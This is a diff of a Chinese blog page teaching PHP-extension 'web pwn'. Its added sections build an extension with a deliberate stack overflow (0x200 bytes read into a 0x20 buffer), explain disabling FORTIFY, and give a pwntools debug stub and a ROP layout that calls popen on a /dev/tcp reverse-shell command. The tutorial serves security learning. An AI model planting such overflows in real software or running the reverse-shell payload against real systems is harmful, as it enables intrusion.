@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 12345sudo apt install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径 下载对应版本的源代码:https://github.com/php/php-src/releases. 进入">
+  <meta name="description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 编译环境 123456sudo apt-get install bison libxml2 libxml2-devsudo apt-get install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径">
 <meta name="keywords" content="Linux">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IS-pwn-Linux-WEBPWN基础">
 <meta property="og:url" content="https://hitworld.github.io/posts/a6939fc8/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 12345sudo apt install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径 下载对应版本的源代码:https://github.com/php/php-src/releases. 进入">
+<meta property="og:description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 编译环境 123456sudo apt-get install bison libxml2 libxml2-devsudo apt-get install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-26T08:49:16.678Z">
+<meta property="og:updated_time" content="2020-08-30T06:55:34.861Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-WEBPWN基础">
-<meta name="twitter:description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 12345sudo apt install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径 下载对应版本的源代码:https://github.com/php/php-src/releases. 进入">
+<meta name="twitter:description" content="0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 编译环境 123456sudo apt-get install bison libxml2 libxml2-devsudo apt-get install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径">
 
 
 
@@ -503,7 +503,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">908</span>
+                <span title="本文字数">1.8k</span>
               
 
               
@@ -517,7 +517,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">2 分钟</span>
               
             </div>
           
@@ -540,10 +540,26 @@
         <h2 id="x00">0x00</h2>
 <p>现在大部分<code>WEBPWN</code>就是通过存在漏洞的<code>PHP</code>动态扩展库来劫持控制流反弹<code>shell</code>.</p>
 <h2 id="一个简单的demo">一个简单的demo</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php php-dev</span><br><span class="line">php -v</span><br><span class="line"><span class="comment">#版本</span></span><br><span class="line">php -i | grep -i extension_dir</span><br><span class="line"><span class="comment">#扩展模块放置的路径</span></span><br></pre></td></tr></table></figure>
+<h3 id="编译环境">编译环境</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bison libxml2 libxml2-dev</span><br><span class="line">sudo apt-get install php php-dev</span><br><span class="line">php -v</span><br><span class="line"><span class="comment">#版本</span></span><br><span class="line">php -i | grep -i extension_dir</span><br><span class="line"><span class="comment">#扩展模块放置的路径</span></span><br></pre></td></tr></table></figure>
 <p>下载对应版本的源代码:<code>https://github.com/php/php-src/releases</code>.</p>
-<p>进入源代码目录,使用脚本生成扩展模块的工程项目.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/php-src-php-7.0.33/ext$ ./ext_skel --extname=demo</span><br><span class="line">Creating directory demo</span><br><span class="line">Creating basic files: config.m4 config.w32 .gitignore demo.c php_demo.h CREDITS EXPERIMENTAL tests/001.phpt demo.php [<span class="keyword">done</span>].</span><br><span class="line"></span><br><span class="line">To use your new extension, you will have to execute the following steps:</span><br><span class="line"></span><br><span class="line">1.  $ <span class="built_in">cd</span> ..</span><br><span class="line">2.  $ vi ext/demo/config.m4</span><br><span class="line">3.  $ ./buildconf</span><br><span class="line">4.  $ ./configure --[with|<span class="built_in">enable</span>]-demo</span><br><span class="line">5.  $ make</span><br><span class="line">6.  $ ./sapi/cli/php -f ext/demo/demo.php</span><br><span class="line">7.  $ vi ext/demo/demo.c</span><br><span class="line">8.  $ make</span><br><span class="line"></span><br><span class="line">Repeat steps 3-6 until you are satisfied with ext/demo/config.m4 and</span><br><span class="line">step 6 confirms that your module is compiled into PHP. Then, start writing</span><br><span class="line">code and repeat the last two steps as often as necessary.</span><br></pre></td></tr></table></figure>
+<p>进入源代码目录,使用脚本生成扩展模块的工程项目,然后单独编译扩展模块.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php-src-php-7.2.24/ext$ ./ext_skel --extname=easy_phppwn</span><br><span class="line">php-src-php-7.2.24/ext$ <span class="built_in">cd</span> easy_phppwn/</span><br><span class="line">php-src-php-7.2.24/ext/easy_phppwn$ /usr/bin/phpize</span><br><span class="line">php-src-php-7.2.24/ext/easy_phppwn$ ./configure --with-php-config=/usr/bin/php-config7.2</span><br><span class="line">php-src-php-7.2.24/ext/easy_phppwn$ make</span><br></pre></td></tr></table></figure>
+<p><code>make</code>生成的文件在<code>./modules</code>目录下,<code>make install</code>可以安装扩展模块到指定的<code>php</code>版本.</p>
+<p><code>php --ini</code>找到<code>php.ini</code>,在<code>php.ini</code>中增加<code>extension=easy_phppwn.so</code></p>
+<h3 id="漏洞函数">漏洞函数</h3>
+<p>在<code>easy_phppwn.c</code>中编写扩展函数.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(easy_phppwn_hello) &#123;</span><br><span class="line">  <span class="keyword">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">size_t</span> arg_len, len;</span><br><span class="line">  zend_string *strg;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">  <span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"s"</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">  php_printf(<span class="string">"Hello\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并在初始化函数中调用,编译时需要去掉<code>Makefile</code>中的<code>-O2</code>,否则会开启<code>FORTIFY</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> zend_function_entry easy_phppwn_functions[] = &#123;</span><br><span class="line">  PHP_FE(easy_phppwn_hello,	<span class="literal">NULL</span>)</span><br><span class="line">  PHP_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>调用漏洞函数.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  easy_phppwn_hello(<span class="string">"unuse"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="调试">调试</h3>
+<p>函数名需要处理一下,<code>easy_phppwn_hello</code>实际上是<code>zif_easy_phppwn_hello</code>(<code>IDA</code>中可以看见真实的函数名),然后下断点调试即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">"php"</span>, <span class="string">"test.php"</span>])</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="获取shell">获取shell</h3>
+<p>可以通过使用<code>popen</code>来开启一个反弹<code>shell</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">command = <span class="string">'/bin/bash -c "/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1"'</span></span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">  padding,</span><br><span class="line">  pop_rdi_ret,</span><br><span class="line">  stack_addr + <span class="number">0x88</span> + <span class="number">0x30</span> + <span class="number">0x60</span>,</span><br><span class="line">  pop_rsi_ret,</span><br><span class="line">  stack_addr + <span class="number">0x88</span> + <span class="number">0x28</span>,</span><br><span class="line">  popen_addr,</span><br><span class="line">  <span class="string">'r'</span> + <span class="string">'x00'</span> * <span class="number">7</span>,</span><br><span class="line">  <span class="string">'a'</span> * <span class="number">0x60</span>,</span><br><span class="line">  command.ljust(<span class="number">0x60</span>, <span class="string">'x00'</span>),</span><br><span class="line">  <span class="string">"a"</span> * <span class="number">0x8</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -666,7 +682,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">169</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -860,7 +876,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个简单的demo"><span class="nav-number">2.</span> <span class="nav-text">一个简单的demo</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个简单的demo"><span class="nav-number">2.</span> <span class="nav-text">一个简单的demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编译环境"><span class="nav-number">2.1.</span> <span class="nav-text">编译环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞函数"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">2.3.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取shell"><span class="nav-number">2.4.</span> <span class="nav-text">获取shell</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -892,7 +908,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">716k</span>
+    <span title="站点总字数">724k</span>
   
 
   
@@ -901,7 +917,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:51</span>
+    <span title="站点阅读时长">10:58</span>
   
 </div>
 
@@ -1550,7 +1566,7 @@
   //$("body").backstretch("/images/background.jpg");
   </script>
   
-  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
